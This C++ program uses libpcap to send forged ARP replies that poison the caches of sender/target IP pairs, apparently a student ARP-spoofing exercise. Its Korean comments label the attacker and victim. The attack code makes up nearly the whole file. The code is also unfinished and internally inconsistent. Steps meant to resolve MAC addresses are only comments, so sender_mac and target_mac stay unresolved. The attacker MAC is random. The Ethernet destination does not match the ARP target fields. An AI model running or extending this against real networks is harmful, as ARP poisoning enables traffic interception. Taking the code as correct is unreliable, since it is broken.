#include <cstdio>
#include <pcap.h>
#include <cstdlib>
#include <cstring>
#include "ethhdr.h"
#include "arphdr.h"
#include "mac.h"
#include "ip.h"

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

void send_arp_infection(pcap_t* handle, const Mac& my_mac, const Mac& target_mac,
                        const Ip& sender_ip, const Mac& sender_mac, const Ip& target_ip) {
    EthArpPacket packet;

    packet.eth_.dmac_ = target_mac;
    packet.eth_.smac_ = my_mac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_ = htons(ArpHdr::ETHER);
    packet.arp_.pro_ = htons(EthHdr::Ip4);
    packet.arp_.hln_ = Mac::SIZE;
    packet.arp_.pln_ = Ip::SIZE;
    packet.arp_.op_ = htons(ArpHdr::Reply);
    packet.arp_.smac_ = my_mac;
    packet.arp_.sip_ = htonl(target_ip);
    packet.arp_.tmac_ = sender_mac;
    packet.arp_.tip_ = htonl(sender_ip);

    int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
    }
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        fprintf(stderr, "syntax: %s <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n", argv[0]);
        return -1;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (handle == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return -1;
    }

    // 공격자 MAC 주소
    Mac my_mac = Mac::randomMac();

    // 공격자/피해자IP 쌍 반복 수행
    for (int i = 2; i < argc; i += 2) {
        Ip sender_ip(argv[i]);
        Ip target_ip(argv[i + 1]);

        // MAC 주소 알아오기
        Mac sender_mac;
        //  ARP 리퀘스트 보내고, ARP 응답을 받아 Sender Mac 주소 파악

        //ARP 리퀘스트로 타겟 게이트웨이 맥 주소 확인
        Mac target_mac;
        // 타겟(게이트웨이)의 맥 주소 파악

        send_arp_infection(handle, my_mac, target_mac, sender_ip, sender_mac, target_ip);
    }

    pcap_close(handle);
    return 0;
}
